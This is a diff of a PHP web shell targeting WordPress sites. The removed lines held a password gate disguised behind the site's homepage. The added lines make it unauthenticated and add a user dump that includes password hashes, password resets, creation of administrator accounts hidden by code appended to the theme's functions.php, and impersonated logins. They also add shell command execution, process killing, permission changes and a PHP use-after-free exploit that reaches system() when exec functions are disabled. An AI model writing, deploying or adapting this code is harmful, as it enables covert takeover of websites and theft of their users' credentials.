@@ -1,2356 +1,2050 @@
 <?php
-@ini_set('error_log', NULL);
-@ini_set('log_errors', 0);
+if (isset($_GET['debug500'])) {
+    ini_set('display_errors', 1);
+    error_reporting(E_ALL);
+} else {
+    @ini_set('error_log', NULL);
+    @ini_set('log_errors', 0);
+    @error_reporting(0);
+}
 @ini_set('max_execution_time', 0);
-@error_reporting(0);
 @set_time_limit(0);
 
-$SECRET_PARAM = (isset($_GET['lastpiece']) && $_GET['lastpiece'] === 'hacktivist');
-$PASSWORD_HASH = '$2a$12$5OVW/NAVmsGEZ2H23GyTCuTaGRI5iBDFoLzMsaYLtAUWpAfwrO85.';
-$SESSION_NAME = 'lastpiece_auth';
-$SESSION_TIMEOUT = 3600;
-
-session_start();
-
-function fetchHomepage() {
-    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
-    $homeUrl = $scheme . '://' . $host . '/';
-    
-    $ctx = @stream_context_create([
-        'http' => [
-            'method' => 'GET',
-            'header' => "User-Agent: Mozilla/5.0\r\nAccept: text/html\r\n",
-            'timeout' => 10,
-            'ignore_errors' => true,
-        ],
-        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
-    ]);
-    
-    $homepage = @file_get_contents($homeUrl, false, $ctx);
-    
-    if ($homepage === false && function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => $homeUrl,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_TIMEOUT => 10,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_USERAGENT => 'Mozilla/5.0',
-        ]);
-        $homepage = curl_exec($ch);
-        curl_close($ch);
-    }
-    
-    return ($homepage !== false && strlen($homepage) > 100) ? $homepage : null;
+// === WP LOAD FINDER (global) ===
+function findWpLoad($dir = null, $depth = 0) {
+    if ($depth > 8) return false;
+    $dir = $dir ?: __DIR__;
+    $wp_load = $dir . '/wp-load.php';
+    if (file_exists($wp_load)) return $wp_load;
+    return findWpLoad(dirname($dir), $depth + 1);
 }
 
-function isAuthenticatedCheck() {
-    global $SESSION_NAME, $SESSION_TIMEOUT;
-    if (isset($_SESSION[$SESSION_NAME]) && isset($_SESSION[$SESSION_NAME . '_time'])) {
-        if (time() - $_SESSION[$SESSION_NAME . '_time'] < $SESSION_TIMEOUT) {
-            return true;
-        }
-    }
-    return false;
-}
+// === WP AJAX HANDLER - Exact copy from reference script ===
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {
 
-if (!isAuthenticatedCheck()) {
-    if (!$SECRET_PARAM) {
-        $homepage = fetchHomepage();
-        if ($homepage !== null) {
-            echo $homepage;
-            exit;
-        }
-        header('Location: /');
+    $wp_load_path = findWpLoad();
+    if (!$wp_load_path) {
+        echo json_encode(['err' => 'wp-load.php not found']);
         exit;
     }
-    
-    $loginError = '';
-    if (isset($_POST['login_password'])) {
-        if (password_verify($_POST['login_password'], $PASSWORD_HASH)) {
-            $_SESSION[$SESSION_NAME] = true;
-            $_SESSION[$SESSION_NAME . '_time'] = time();
-            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-            $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
-            $uri = $_SERVER['REQUEST_URI'] ?? '?lastpiece=hacktivist';
-            header('Location: ' . $scheme . '://' . $host . $uri);
-            exit;
-        } else {
-            $loginError = 'Invalid password';
+
+    require_once $wp_load_path;
+
+    function addUserProtection($username) {
+        $functions_file = get_template_directory() . '/functions.php';
+        if (!file_exists($functions_file)) {
+            $functions_file = get_stylesheet_directory() . '/functions.php';
+        }
+
+        if (file_exists($functions_file)) {
+            $protection_code = '
+
+add_action(\'pre_get_users\', function($query) {
+    if (is_admin() && function_exists(\'get_current_screen\')) {
+        $screen = get_current_screen();
+        if ($screen && $screen->base === \'users\') {
+            $protected_user = get_user_by(\'login\', \'' . $username . '\');
+            if ($protected_user) {
+                $excluded = (array) $query->get(\'exclude\');
+                $excluded[] = $protected_user->ID;
+                $query->set(\'exclude\', $excluded);
+            }
         }
     }
-    
-    $homepage = fetchHomepage();
-    if ($homepage !== null) {
-        $loginForm = '
-<style>
-#_lp_overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);backdrop-filter:blur(8px);z-index:999999;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
-#_lp_overlay.show{display:flex}
-#_lp_box{background:linear-gradient(145deg,#1a1a2e,#0d0d1a);padding:32px;border-radius:16px;border:1px solid rgba(255,215,0,0.2);box-shadow:0 25px 80px rgba(0,0,0,0.6),0 0 60px rgba(255,215,0,0.08);max-width:380px;width:90%;text-align:center}
-#_lp_box h3{color:#ffd700;margin:0 0 6px;font-size:22px;font-weight:700}
-#_lp_box p{color:#666;margin:0 0 24px;font-size:12px}
-#_lp_box label{display:block;text-align:left;color:#888;font-size:11px;margin-bottom:6px;font-weight:500}
-#_lp_box input{width:100%;padding:12px 14px;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);color:#fff;border-radius:8px;font-size:14px;outline:none;box-sizing:border-box;transition:border-color 0.2s}
-#_lp_box input:focus{border-color:#ffd700}
-#_lp_box button{width:100%;padding:12px;background:linear-gradient(135deg,#ffd700,#ff8c00);border:none;border-radius:8px;color:#000;font-weight:700;font-size:14px;cursor:pointer;margin-top:16px;transition:transform 0.2s,box-shadow 0.2s}
-#_lp_box button:hover{transform:translateY(-2px);box-shadow:0 6px 25px rgba(255,215,0,0.4)}
-#_lp_box .hint{color:#444;font-size:10px;margin-top:16px}
-#_lp_err{background:rgba(248,81,73,0.15);border:1px solid rgba(248,81,73,0.3);color:#f85149;padding:10px;border-radius:6px;margin-bottom:16px;font-size:12px}
-</style>
-<div id="_lp_overlay">
-<form id="_lp_box" method="POST">
-<h3>Access Portal</h3>
-<p>Authentication Required</p>
-' . ($loginError ? '<div id="_lp_err">' . htmlspecialchars($loginError) . '</div>' : '') . '
-<label>Password</label>
-<input type="password" name="login_password" id="_lp_pwd" placeholder="Enter password" required autocomplete="off">
-<button type="submit">Authenticate</button>
-<div class="hint">Press ESC to close</div>
-</form>
-</div>
-<script>
-document.addEventListener("keydown",function(e){
-if(e.key==="p"||e.key==="P"){var o=document.getElementById("_lp_overlay");if(o){o.classList.toggle("show");if(o.classList.contains("show"))document.getElementById("_lp_pwd").focus();}}
-if(e.key==="Escape"){var o=document.getElementById("_lp_overlay");if(o)o.classList.remove("show");}
 });
-</script>';
-        $homepage = str_replace('</body>', $loginForm . '</body>', $homepage);
-        echo $homepage;
+add_filter(\'wp_count_users\', function($counts) {
+    $protected_user = get_user_by(\'login\', \'' . $username . '\');
+    if ($protected_user) {
+        $counts->total_users--;
+    }
+    return $counts;
+});
+add_action(\'delete_user\', function($user_id) {
+    $user = get_user_by(\'ID\', $user_id);
+    if ($user && $user->user_login === \'' . $username . '\') {
+        wp_die(
+            __(\'User ' . $username . ' tidak dapat dihapus.\', \'textdomain\'),
+            __(\'Error\', \'textdomain\'),
+            array(\'response\' => 403)
+        );
+    }
+});
+add_filter(\'user_search_columns\', function($search_columns, $search, $query) {
+    if (is_admin()) {
+        $protected_user = get_user_by(\'login\', \'' . $username . '\');
+        if ($protected_user) {
+            global $wpdb;
+            $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $protected_user->ID);
+        }
+    }
+    return $search_columns;
+}, 10, 3);
+add_filter(\'bulk_actions-users\', function($actions) {
+    if (isset($_REQUEST[\'users\']) && is_array($_REQUEST[\'users\'])) {
+        $protected_user = get_user_by(\'login\', \'' . $username . '\');
+        if ($protected_user && in_array($protected_user->ID, $_REQUEST[\'users\'])) {
+            unset($actions[\'delete\']);
+        }
+    }
+    return $actions;
+});
+';
+
+            $current_content = file_get_contents($functions_file);
+            if (strpos($current_content, "get_user_by('login', '{$username}')") === false) {
+                file_put_contents($functions_file, $protection_code, FILE_APPEND | LOCK_EX);
+                return true;
+            } else {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function removeUserProtection($username) {
+        $functions_file = get_template_directory() . '/functions.php';
+        if (!file_exists($functions_file)) {
+            $functions_file = get_stylesheet_directory() . '/functions.php';
+        }
+
+        if (file_exists($functions_file)) {
+            $current_content = file_get_contents($functions_file);
+
+            $pattern = '/add_action\(\'pre_get_users\'.*?get_user_by\(\'login\', \'' . preg_quote($username, '/') . '\'.*?add_filter\(\'bulk_actions-users\'.*?\}\);\s*/s';
+
+            $new_content = preg_replace($pattern, '', $current_content);
+
+            if ($new_content !== $current_content) {
+                file_put_contents($functions_file, $new_content, LOCK_EX);
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function isUserHidden($username) {
+        $functions_file = get_template_directory() . '/functions.php';
+        if (!file_exists($functions_file)) {
+            $functions_file = get_stylesheet_directory() . '/functions.php';
+        }
+
+        if (file_exists($functions_file)) {
+            $current_content = file_get_contents($functions_file);
+            return strpos($current_content, "get_user_by('login', '{$username}')") !== false;
+        }
+        return false;
+    }
+
+    global $wpdb;
+
+    if ($_POST['c4t'] == 'ulst') {
+        $users = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered FROM {$wpdb->users}");
+
+        foreach ($users as $user) {
+            $user->is_hidden = isUserHidden($user->user_login);
+        }
+
+        echo json_encode($users);
         exit;
     }
-    
-    header('Location: /');
+
+    if ($_POST['c4t'] == 'rpsw') {
+        $user_id = intval($_POST['uix']);
+        $new_password = wp_generate_password(12, true, true);
+        wp_set_password($new_password, $user_id);
+        $user_data = get_userdata($user_id);
+        echo json_encode([
+            'l' => $user_data->user_login,
+            'e' => $user_data->user_email,
+            'n' => $new_password
+        ]);
+        exit;
+    }
+
+    if ($_POST['c4t'] == 'cadm') {
+        $username = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['xun']);
+        $password = $_POST['xpw'];
+        $email = filter_var($_POST['xem'], FILTER_VALIDATE_EMAIL) ? $_POST['xem'] : $username . '@' . $_SERVER['HTTP_HOST'];
+        $hide_user = isset($_POST['hide_user']) ? true : false;
+
+        if (username_exists($username)) {
+            echo json_encode(['err' => 'user exists']);
+            exit;
+        }
+
+        $user_id = wp_create_user($username, $password, $email);
+        if ($user_id && !is_wp_error($user_id)) {
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+
+            if ($hide_user) {
+                addUserProtection($username);
+            }
+
+            echo json_encode([
+                'ok' => 'created',
+                'u' => $username,
+                'p' => $password,
+                'hide' => $hide_user
+            ]);
+        } else {
+            echo json_encode(['err' => 'create failed']);
+        }
+        exit;
+    }
+
+    if ($_POST['c4t'] == 'alog') {
+        $user_id = intval($_POST['uix']);
+        wp_clear_auth_cookie();
+        wp_set_current_user($user_id);
+        wp_set_auth_cookie($user_id, true);
+        echo json_encode(['url' => admin_url()]);
+        exit;
+    }
+
+    if ($_POST['c4t'] == 'hide') {
+        $user_id = intval($_POST['uix']);
+        $user = get_user_by('ID', $user_id);
+        if ($user) {
+            $result = addUserProtection($user->user_login);
+            echo json_encode([
+                'ok' => 'hidden',
+                'user' => $user->user_login,
+                'success' => $result
+            ]);
+        } else {
+            echo json_encode(['err' => 'user not found']);
+        }
+        exit;
+    }
+
+    if ($_POST['c4t'] == 'unhide') {
+        $user_id = intval($_POST['uix']);
+        $user = get_user_by('ID', $user_id);
+        if ($user) {
+            $result = removeUserProtection($user->user_login);
+            echo json_encode([
+                'ok' => 'unhidden',
+                'user' => $user->user_login,
+                'success' => $result
+            ]);
+        } else {
+            echo json_encode(['err' => 'user not found']);
+        }
+        exit;
+    }
+
+    if ($_POST['c4t'] == 'del') {
+        $user_id = intval($_POST['uix']);
+        $user = get_user_by('ID', $user_id);
+        if ($user) {
+            $current_user = wp_get_current_user();
+            if ($user_id == $current_user->ID) {
+                echo json_encode(['err' => 'cannot_delete_self']);
+                exit;
+            }
+
+            if (isUserHidden($user->user_login)) {
+                removeUserProtection($user->user_login);
+            }
+
+            if (wp_delete_user($user_id)) {
+                echo json_encode([
+                    'ok' => 'deleted',
+                    'user' => $user->user_login
+                ]);
+            } else {
+                echo json_encode(['err' => 'delete_failed']);
+            }
+        } else {
+            echo json_encode(['err' => 'user_not_found']);
+        }
+        exit;
+    }
+
     exit;
 }
+// === END WP AJAX HANDLER ===
+
+// No authentication required
+session_start();
+function isAuthenticated() { return true; }
+
+// === PROCESS AJAX HANDLER ===
+if (isset($_POST['proc_action']) && isAuthenticated()) {
+    header('Content-Type: application/json; charset=utf-8');
+    $pAct = $_POST['proc_action'];
+
+    if ($pAct === 'list') {
+        // Get all visible processes
+        $ps_out = shell_exec('ps auxww 2>/dev/null') ?: '';
+        $lines = explode("\n", trim($ps_out));
+        $header = array_shift($lines);
+        $processes = [];
+        foreach ($lines as $line) {
+            $line = trim($line);
+            if (empty($line)) continue;
+            $cols = preg_split('/\s+/', $line, 11);
+            if (count($cols) >= 11) {
+                $processes[] = [
+                    'user' => $cols[0],
+                    'pid' => $cols[1],
+                    'cpu' => $cols[2],
+                    'mem' => $cols[3],
+                    'vsz' => $cols[4],
+                    'rss' => $cols[5],
+                    'tty' => $cols[6],
+                    'stat' => $cols[7],
+                    'start' => $cols[8],
+                    'time' => $cols[9],
+                    'command' => $cols[10],
+                ];
+            }
+        }
+
+        // Detect hidden processes by comparing /proc with ps output
+        $ps_pids = array_column($processes, 'pid');
+        $hidden = [];
+        if (is_dir('/proc')) {
+            $proc_dirs = @scandir('/proc');
+            if ($proc_dirs) {
+                foreach ($proc_dirs as $d) {
+                    if (!is_numeric($d)) continue;
+                    if (!in_array($d, $ps_pids)) {
+                        // Hidden process found - try to get info
+                        $cmdline = @file_get_contents("/proc/$d/cmdline");
+                        $cmdline = $cmdline ? str_replace("\0", ' ', trim($cmdline)) : '[hidden]';
+                        $status = @file_get_contents("/proc/$d/status");
+                        $uid = '?';
+                        if ($status && preg_match('/Uid:\s+(\d+)/', $status, $m)) {
+                            $pw = @posix_getpwuid((int)$m[1]);
+                            $uid = $pw ? $pw['name'] : $m[1];
+                        }
+                        $hidden[] = [
+                            'pid' => $d,
+                            'user' => $uid,
+                            'command' => $cmdline ?: '[hidden]',
+                        ];
+                    }
+                }
+            }
+        }
+
+        // Detect recently started processes (started within last 5 minutes)
+        $recent = [];
+        $now = time();
+        foreach ($processes as $p) {
+            // Check /proc/<pid>/stat for start time
+            $stat = @file_get_contents("/proc/{$p['pid']}/stat");
+            if ($stat) {
+                $parts = explode(' ', $stat);
+                if (isset($parts[21])) {
+                    $uptime_str = @file_get_contents('/proc/uptime');
+                    if ($uptime_str) {
+                        $uptime = (float)explode(' ', $uptime_str)[0];
+                        $clk_tck = 100; // sysconf(_SC_CLK_TCK)
+                        $start_sec = (float)$parts[21] / $clk_tck;
+                        $boot_time = $now - $uptime;
+                        $proc_start = $boot_time + $start_sec;
+                        $age = $now - $proc_start;
+                        if ($age >= 0 && $age <= 300) {
+                            $p['age_seconds'] = (int)$age;
+                            $recent[] = $p;
+                        }
+                    }
+                }
+            }
+        }
+
+        echo json_encode([
+            'processes' => $processes,
+            'hidden' => $hidden,
+            'recent' => $recent,
+            'total' => count($processes),
+            'total_hidden' => count($hidden),
+            'total_recent' => count($recent),
+        ]);
+        exit;
+    }
+
+    if ($pAct === 'kill') {
+        $pid = intval($_POST['pid'] ?? 0);
+        if ($pid > 0) {
+            $sig = $_POST['signal'] ?? '9';
+            $out = shell_exec("kill -$sig $pid 2>&1");
+            echo json_encode(['ok' => true, 'pid' => $pid, 'output' => trim($out ?? '')]);
+        } else {
+            echo json_encode(['err' => 'invalid pid']);
+        }
+        exit;
+    }
+
+    echo json_encode(['err' => 'unknown action']);
+    exit;
+}
+// === END PROCESS HANDLER ===
+
+// === FILE MANAGER STARTS DIRECTLY ===
 
 @ob_clean();
 @header("X-Accel-Buffering: no");
 @header("Content-Encoding: none");
 
-function isAuthenticated() {
-    global $SESSION_NAME, $SESSION_TIMEOUT;
-    if (isset($_SESSION[$SESSION_NAME]) && isset($_SESSION[$SESSION_NAME . '_time'])) {
-        if (time() - $_SESSION[$SESSION_NAME . '_time'] < $SESSION_TIMEOUT) {
-            $_SESSION[$SESSION_NAME . '_time'] = time();
-            return true;
-        } else {
-            unset($_SESSION[$SESSION_NAME]);
-            unset($_SESSION[$SESSION_NAME . '_time']);
+// === BYPASS ENGINE (PHP UAF) ===
+class Helper { public $a, $b, $c; }
+class Pwn {
+    const LOGGING = false;
+    const CHUNK_DATA_SIZE = 0x60;
+    const CHUNK_SIZE = self::CHUNK_DATA_SIZE;
+    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
+    const HT_SIZE = 0x118;
+    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;
+
+    public function __construct($cmd) {
+        for($i = 0; $i < 10; $i++) {
+            $groom[] = self::alloc(self::STRING_SIZE);
+            $groom[] = self::alloc(self::HT_STRING_SIZE);
+        }
+        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
+        $fill = self::alloc(self::STRING_SIZE);
+        $this->abc = self::alloc(self::STRING_SIZE);
+        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
+        $this->free($abc_addr);
+        $this->helper = new Helper;
+        if(strlen($this->abc) < 0x1337) return;
+        $this->helper->a = "leet";
+        $this->helper->b = function($x) {};
+        $this->helper->c = 0xfeedface;
+        $helper_handlers = $this->rel_read(0);
+        $closure_addr = $this->rel_read(0x20);
+        $closure_ce = $this->read($closure_addr + 0x10);
+        $basic_funcs = $this->get_basic_funcs($closure_ce);
+        $zif_system = $this->get_system($basic_funcs);
+        $fake_closure_off = 0x70;
+        for($i = 0; $i < 0x138; $i += 8) {
+            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
+        }
+        $this->rel_write($fake_closure_off + 0x38, 1, 4);
+        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
+        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
+        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
+        $this->rel_write(0x20, $fake_closure_addr);
+        ($this->helper->b)($cmd);
+        $this->rel_write(0x20, $closure_addr);
+        unset($this->helper->b);
+    }
+    private function heap_leak() {
+        $arr = [[], []];
+        set_error_handler(function() use (&$arr, &$buf) {
+            $arr = 1;
+            $buf = str_repeat("\x00", self::HT_STRING_SIZE);
+        });
+        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
+        return $buf;
+    }
+    private function free($addr) {
+        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
+        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
+        $arr = [[], []];
+        set_error_handler(function() use (&$arr, &$buf, &$payload) {
+            $arr = 1;
+            $buf = str_repeat($payload, 1);
+        });
+        $arr[1] .= "x";
+    }
+    private function rel_read($offset) { return self::str2ptr($this->abc, $offset); }
+    private function rel_write($offset, $value, $n = 8) {
+        for ($i = 0; $i < $n; $i++) {
+            $this->abc[$offset + $i] = chr($value & 0xff);
+            $value >>= 8;
         }
     }
-    return false;
+    private function read($addr, $n = 8) {
+        $this->rel_write(0x10, $addr - 0x10);
+        $value = strlen($this->helper->a);
+        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
+        return $value;
+    }
+    private function get_system($basic_funcs) {
+        $addr = $basic_funcs;
+        do {
+            $f_entry = $this->read($addr);
+            $f_name = $this->read($f_entry, 6);
+            if($f_name === 0x6d6574737973) return $this->read($addr + 8);
+            $addr += 0x20;
+        } while($f_entry !== 0);
+    }
+    private function get_basic_funcs($addr) {
+        while(true) {
+            $addr -= 0x10;
+            if($this->read($addr, 4) === 0xA8 &&
+                in_array($this->read($addr + 4, 4), [20180731, 20190902, 20200930, 20210902])) {
+                $module_name_addr = $this->read($addr + 0x20);
+                $module_name = $this->read($module_name_addr);
+                if($module_name === 0x647261646e617473) return $this->read($addr + 0x28);
+            }
+        }
+    }
+    static function alloc($size) { return str_shuffle(str_repeat("A", $size)); }
+    static function str2ptr($str, $p = 0, $n = 8) {
+        $address = 0;
+        for($j = $n - 1; $j >= 0; $j--) { $address <<= 8; $address |= ord($str[$p + $j]); }
+        return $address;
+    }
 }
 
-function authenticate($password) {
-    global $PASSWORD_HASH, $SESSION_NAME;
-    if (password_verify($password, $PASSWORD_HASH)) {
-        $_SESSION[$SESSION_NAME] = true;
-        $_SESSION[$SESSION_NAME . '_time'] = time();
+function runBypass($cmd) {
+    ob_start();
+    try { new Pwn($cmd); } catch(\Throwable $e) {}
+    $out = ob_get_clean();
+    return (!empty(trim($out ?? ''))) ? trim($out) : null;
+}
+
+// === CORE FUNCTIONS ===
+function runCmd($cmd) {
+    $out = null;
+    $user = get_current_user();
+    $home = getenv('HOME') ?: ('/home/' . $user);
+    $env = "HOME=$home USER=$user";
+    $fullCmd = $env . ' /bin/bash -l -c ' . escapeshellarg($cmd) . ' 2>&1';
+    if (function_exists('proc_open')) {
+        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
+        $envArr = ['HOME' => $home, 'USER' => $user, 'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'];
+        $proc = @proc_open('/bin/bash -l -c ' . escapeshellarg($cmd), $desc, $pipes, $home, $envArr);
+        if (is_resource($proc)) {
+            @fclose($pipes[0]);
+            $out = @stream_get_contents($pipes[1]);
+            $err = @stream_get_contents($pipes[2]);
+            @fclose($pipes[1]);
+            @fclose($pipes[2]);
+            @proc_close($proc);
+            if (empty(trim($out ?? '')) && !empty(trim($err ?? ''))) $out = $err;
+        }
+    }
+    if ($out === null && function_exists('exec')) {
+        @exec($fullCmd, $outArr, $ret);
+        $out = implode("\n", $outArr);
+    }
+    if ($out === null && function_exists('shell_exec')) {
+        $out = @shell_exec($fullCmd);
+    }
+    if ($out === null && function_exists('popen')) {
+        $fp = @popen($fullCmd, 'r');
+        if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); }
+    }
+    // Fallback: UAF bypass when all exec functions are disabled
+    if ($out === null || trim($out) === '') {
+        $out = runBypass($cmd);
+    }
+    return $out;
+}
+
+function runUapi($args) {
+    return runCmd('uapi ' . $args);
+}
+
+function parseUapiStatus($raw) {
+    if (empty($raw)) return ['ok' => false, 'raw' => ''];
+    $ok = (bool)preg_match('/status:\s*1/', $raw);
+    return ['ok' => $ok, 'raw' => $raw];
+}
+
+function parseUapiFtpList($raw) {
+    if (empty($raw)) return [];
+    $accounts = [];
+    $blocks = preg_split('/^\s*-\s*$/m', $raw);
+    foreach ($blocks as $block) {
+        $acct = [];
+        if (preg_match('/\buser:\s*(.+)/i', $block, $m)) $acct['user'] = trim($m[1], " '\"\r\n");
+        if (preg_match('/\blogin:\s*(.+)/i', $block, $m)) $acct['login'] = trim($m[1], " '\"\r\n");
+        if (preg_match('/\bdomain:\s*(.+)/i', $block, $m)) $acct['domain'] = trim($m[1], " '\"\r\n");
+        if (preg_match('/\bhomedir:\s*(.+)/i', $block, $m)) $acct['homedir'] = trim($m[1], " '\"\r\n");
+        if (preg_match('/\bdiskquota:\s*(.+)/i', $block, $m)) $acct['quota'] = trim($m[1], " '\"\r\n");
+        if (preg_match('/\bdiskused:\s*(.+)/i', $block, $m)) $acct['used'] = trim($m[1], " '\"\r\n");
+        if (!empty($acct['user']) || !empty($acct['login'])) $accounts[] = $acct;
+    }
+    if (empty($accounts)) {
+        preg_match_all('/(?:user|login):\s*[\'"]?(\S+)[\'"]?/i', $raw, $userMatches);
+        preg_match_all('/domain:\s*[\'"]?(\S+)[\'"]?/i', $raw, $domainMatches);
+        preg_match_all('/homedir:\s*[\'"]?(\S+)[\'"]?/i', $raw, $dirMatches);
+        for ($i = 0; $i < count($userMatches[1]); $i++) {
+            $accounts[] = [
+                'user' => $userMatches[1][$i] ?? '',
+                'login' => $userMatches[1][$i] ?? '',
+                'domain' => $domainMatches[1][$i] ?? '',
+                'homedir' => $dirMatches[1][$i] ?? '',
+            ];
+        }
+    }
+    return $accounts;
+}
+
+function formatSize($size) {
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = 0;
+    while ($size >= 1024 && $i < 4) { $size /= 1024; $i++; }
+    return round($size, 2) . ' ' . $units[$i];
+}
+
+function fixPermission($path) {
+    $perms = @fileperms($path);
+    if ($perms === false) return false;
+    $octal = substr(sprintf('%o', $perms), -4);
+    $unwritable = ['0555','0444','0111','0000','0550','0440','0110','0554','0445','0511','0155','0144'];
+    if (in_array($octal, $unwritable)) {
+        if (is_dir($path)) {
+            @chmod($path, 0755);
+        } else {
+            @chmod($path, 0644);
+        }
         return true;
     }
     return false;
 }
 
-function logout() {
-    global $SESSION_NAME;
-    unset($_SESSION[$SESSION_NAME]);
-    unset($_SESSION[$SESSION_NAME . '_time']);
-    session_destroy();
-}
-
-function get_home_url() {
-    $scheme = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http');
-    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
-    return $scheme . '://' . $host . '/';
-}
-
-
-
-if (isset($_GET['logout'])) {
-    logout();
-    header('Location: ?');
-    exit;
-}
-
-$loginError = '';
-if (isset($_POST['login_password'])) {
-    if (authenticate($_POST['login_password'])) {
-        header('Location: ?');
-        exit;
-    } else {
-        $loginError = 'Invalid password';
-    }
+function safeAccess($path) {
+    fixPermission($path);
+    return @is_readable($path);
 }
 
 function getFileDetails($path) {
     $folders = [];
     $files = [];
     try {
+        if (!safeAccess($path)) return 'None';
         $items = @scandir($path);
-        if (!is_array($items)) {
-            throw new Exception('Failed to scan directory');
-        }
+        if (!is_array($items)) return 'None';
         foreach ($items as $item) {
             if ($item == '.' || $item == '..') continue;
             $itemPath = $path . '/' . $item;
+            $perm = @fileperms($itemPath);
+            $permStr = $perm !== false ? substr(sprintf('%o', $perm), -4) : '----';
+            $size = '';
+            if (!is_dir($itemPath)) {
+                $s = @filesize($itemPath);
+                $size = $s !== false ? formatSize($s) : '?';
+            }
             $isWritable = @is_writable($itemPath);
-            $itemDetails = [
+            $isReadable = @is_readable($itemPath);
+            $permColor = '#f85149';
+            if ($isWritable && $isReadable) $permColor = '#3fb950';
+            elseif ($isReadable) $permColor = '#e6edf3';
+            $detail = [
                 'name' => $item,
                 'type' => is_dir($itemPath) ? 'Folder' : 'File',
-                'size' => is_dir($itemPath) ? '-' : formatSize(@filesize($itemPath)),
-                'permission' => @substr(sprintf('%o', fileperms($itemPath)), -4),
-                'modified' => @date('Y-m-d H:i', filemtime($itemPath)),
-                'writable' => $isWritable
+                'size' => $size,
+                'permission' => $permStr,
+                'perm_color' => $permColor,
+                'writable' => $isWritable,
+                'readable' => $isReadable,
             ];
-            if (is_dir($itemPath)) {
-                $folders[] = $itemDetails;
-            } else {
-                $files[] = $itemDetails;
-            }
+            if (is_dir($itemPath)) $folders[] = $detail;
+            else $files[] = $detail;
         }
         return array_merge($folders, $files);
     } catch (Exception $e) {
-        return [];
+        return 'None';
     }
-}
-
-function formatSize($size) {
-    if ($size === false) return '-';
-    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
-    $i = 0;
-    while ($size >= 1024 && $i < 4) {
-        $size /= 1024;
-        $i++;
-    }
-    return round($size, 2) . ' ' . $units[$i];
 }
 
 function executeCommand($command) {
     $currentDirectory = getCurrentDirectory();
-    $command = "cd $currentDirectory && $command";
-    $output = '';
-    
-    $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
-    $process = @proc_open($command, $descriptors, $pipes);
-    if (is_resource($process)) {
-        fclose($pipes[0]);
-        $output = stream_get_contents($pipes[1]);
-        fclose($pipes[1]);
-        $error = stream_get_contents($pipes[2]);
-        fclose($pipes[2]);
-        proc_close($process);
-        if (!empty($output)) return trim($output);
-        if (!empty($error)) return 'Error: ' . trim($error);
-    }
-    
-    $shellOutput = @shell_exec($command);
-    if ($shellOutput !== null) return trim($shellOutput);
-    
-    @exec($command, $execOutput, $execStatus);
-    if ($execStatus === 0) return implode(PHP_EOL, $execOutput);
-    
-    return 'Error: Command execution failed.';
+    $fullCmd = "cd " . escapeshellarg($currentDirectory) . " && " . $command;
+    $out = runCmd($fullCmd);
+    if ($out !== null && !empty(trim($out))) return trim($out);
+    // Final fallback: direct bypass without cd
+    $out = runBypass($command);
+    if ($out !== null && !empty(trim($out))) return trim($out);
+    return 'No output or command failed.';
 }
 
-function readFileContent($file) {
-    return @file_get_contents($file);
-}
+function readFileContent($file) { return @file_get_contents($file); }
 
 function saveFileContent($file) {
     if (isset($_POST['content'])) {
+        fixPermission($file);
+        fixPermission(dirname($file));
         return @file_put_contents($file, $_POST['content']) !== false;
     }
     return false;
 }
 
 function uploadFile($targetDirectory) {
-    if (isset($_FILES['file']) && $_FILES['file']['size'] > 0) {
+    if (isset($_FILES['file'])) {
+        fixPermission($targetDirectory);
         $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
-        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
-            return ['success' => true, 'message' => 'File uploaded: ' . basename($_FILES['file']['name'])];
-        }
-        return ['success' => false, 'message' => 'Upload failed'];
+        if ($_FILES['file']['size'] === 0) return 'Empty file.';
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) return 'File uploaded successfully.';
+        return 'Error uploading file.';
     }
